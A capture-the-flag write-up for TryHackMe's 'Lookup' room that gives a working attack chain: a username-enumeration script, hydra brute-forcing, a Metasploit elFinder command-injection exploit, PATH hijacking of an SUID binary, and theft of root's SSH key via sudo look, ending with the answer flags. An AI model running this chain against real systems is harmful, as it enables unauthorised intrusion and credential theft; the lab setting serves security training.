

# Lookup - TryHackMe Writeup

This is a writeup for the "Lookup" challenge on TryHackMe, you can find [here](https://tryhackme.com/room/lookup)

---


## Steps

### 1. Initial Reconnaissance
- Scanned the target:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.134.216
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS, version, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  ```
- Open ports: 2 (22 and 80).

### 2. Web Access Setup
- Visited `http://[VICTIM IP]`—it redirected to `http://lookup.thm` but didn’t load.
- **Fix**: Added to `/etc/hosts`:
  ```bash
  cd /etc/
  nano hosts
  ```
- Added:
  ```
  10.10.134.216 lookup.thm files.lookup.thm
  ```
- Site loaded, showing a login page.

### 3. Web Enumeration
- Ran `gobuster`:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [PATH TO WORDLIST]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.134.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Results:
  ```
  /server-status (Status: 403)
  ```
- Nothing useful. Noticed the login page behavior: entering `user1:password` said "Wrong username and password," but `admin:password` said "Wrong password," indicating `admin` existed.

### 4. Username Enumeration
- Tried `hydra` on the login form—failed to find passwords.
- Used a Python script (from Grok) to enumerate usernames:
  ```python
  import requests
  import threading
  from queue import Queue
  import argparse

  found_usernames = []
  lock = threading.Lock()
  q = Queue()

  def worker(url, password):
      while not q.empty():
          username = q.get()
          try:
              data = {"username": username, "password": password}
              response = requests.post(url, data=data)
              if "Wrong password" in response.text:
                  with lock:
                      found_usernames.append(username)
                      print(f"Username found: {username}")
          except requests.RequestException as e:
              print(f"Error testing {username}: {e}")
          finally:
              q.task_done()

  def main():
      parser = argparse.ArgumentParser(description='Username Enumeration Tool')
      parser.add_argument('-u', '--url', required=True)
      parser.add_argument('-w', '--wordlist', required=True)
      parser.add_argument('-p', '--password', default='password')
      parser.add_argument('-t', '--threads', type=int, default=10)
      args = parser.parse_args()

      with open(args.wordlist, 'r') as f:
          for line in f:
              username = line.strip()
              if username:
                  q.put(username)

      print(f"Starting enumeration with {args.threads} threads...")
      threads = []
      for _ in range(args.threads):
          t = threading.Thread(target=worker, args=(args.url, args.password))
          t.daemon = True
          t.start()
          threads.append(t)

      q.join()
      print("\nEnumeration complete!")
      if found_usernames:
          print("Valid usernames found:")
          for username in found_usernames:
              print(f"  - {username}")

  if __name__ == '__main__':
      main()
  ```
- Ran it:
  ```bash
  python3 enumerate.py -u http://lookup.thm/login.php -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -t 20
  ```
- Output:
  ```
  Username found: admin
  Username found: jose
  ```

### 5. Brute-Force Login
- Used `hydra` on `jose`:
  ```bash
  hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -t 20
  ```
- Flags explained:
  - `-l`: Single username.
  - `-P`: Password wordlist.
  - `http-post-form`: Attack type.
  - `"/login.php:username=^USER^&password=^PASS^:Wrong"`: Form URL, parameters, failure string.
  - `-t 20`: 20 threads.
- Output:
  ```
  [80][http-post-form] host: lookup.thm   login: jose   password: password123
  ```
- Logged in at `http://lookup.thm/login.php` with `jose:password123`.

### 6. Exploit Subdomain
- Post-login, saw a link to `files.lookup.thm`—it didn’t load.
- Updated `/etc/hosts` (with 'files.lookup.thm').
- Visited `http://files.lookup.thm`, identified elFinder 2.1.47.
- Searched Metasploit:
  ```
  msf6 > search elfinder
  ```
- Used:
  ```
  use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
  set RHOSTS files.lookup.thm
  run
  ```
- Got a Meterpreter session:
  ```
  [*] Meterpreter session 1 opened (10.10.32.151:4444 -> 10.10.134.216:55488)
  ```
- Spawned a shell:
  ```bash
  meterpreter > shell
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

### 7. Explore as www-data
- Checked `/home`:
  ```bash
  cd /home
  ls -la
  ```
- Found user `think`.
- Navigated:
  ```bash
  cd think
  ls -la
  ```
- Saw `user.txt` (root-owned) and `.passwords`.

### 8. Privilege Escalation to think
- Searched for SUID binaries:
  ```bash
  find / -perm /4000 2>/dev/null
  ```
- Found `/usr/sbin/pwm`—unusual SUID binary.
- Checked it:
  ```bash
  file /usr/sbin/pwm
  ```
- Output: `setuid, setgid ELF 64-bit LSB shared object`.
- Ran it:
  ```bash
  /usr/sbin/pwm
  ```
- Output:
  ```
  [!] Running 'id' command to extract the username and UID
  [!] ID: www-data
  [-] File /home/www-data/.passwords not found
  ```
- **Why it’s exploitable**: `pwm` runs as root (SUID) and executes `id` from `$PATH`. We can overwrite `id` to trick it into revealing passwords.
- In `/tmp`:
  ```bash
  cd /tmp
  echo 'echo "uid=1000(think)"' > id
  chmod +x id
  export PATH=/tmp:$PATH
  ```
- **Explanation**:
  - `/tmp`: Writable directory for creating our fake `id`.
  - `echo 'echo "uid=1000(think)"'`: Creates a script mimicking `id` output (`uid=1000(think)` matches the real user). The outer `echo` writes the command; the inner `echo` is what runs.
  - `export PATH=/tmp:$PATH`: Ensures our `id` is used over `/usr/bin/id`.
- Ran `pwm` again:
  ```bash
  /usr/sbin/pwm
  ```
- Output: List of passwords, including `josemario.AKA(think)`.
- Saved to `passwords.txt` and brute-forced SSH:
  ```bash
  hydra -l think -P passwords.txt [VICTIM IP] ssh
  ```
- Output:
  ```
  [22][ssh] host: 10.10.134.216   login: think   password: josemario.AKA(think)
  ```
- **Why SSH**: Port 22 was open, and we needed user access.

### 9. User Access and Flag
- Logged in:
  ```bash
  ssh think@[VICTIM IP]
  ```
- Password: `josemario.AKA(think)`
- Found user flag:
  ```bash
  cat user.txt
  ```
- Content: `38375fb4dd8baa2b2039ac03d92b820e`

### 10. Privilege Escalation to root
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User think may run the following commands on lookup:
      (ALL) /usr/bin/look
  ```
- Used GTFOBins trick:
  ```bash
  sudo look '' /root/.ssh/id_rsa
  ```
- **Explanation**: `look` searches for words in a file starting with a string. With an empty string (`''`), it outputs the entire file if readable as root. We targeted `/root/.ssh/id_rsa` to get the root SSH key.
- Copied the key to `rootrsa`:
  ```bash
  nano rootrsa
  chmod 600 rootrsa
  ```
- Logged in:
  ```bash
  ssh -i rootrsa root@[VICTIM IP]
  ```

### 11. Root Flag
- Listed files:
  ```bash
  ls
  ```
- Read flag:
  ```bash
  cat root.txt
  ```
- Content: `5a285a9f257e45c68bb6c9f9f57d18e8`

---

## Answers to Challenge Questions
1. **User flag**: `38375fb4dd8baa2b2039ac03d92b820e`
2. **Root flag**: `5a285a9f257e45c68bb6c9f9f57d18e8`

---

## Tools Used
- `nmap`: Port scanning.
- `gobuster`: Directory enumeration.
- `hydra`: Brute-forcing.
- Metasploit: elFinder exploit.
- Custom Python script: Username enumeration.
- `ssh`: Remote access.

---

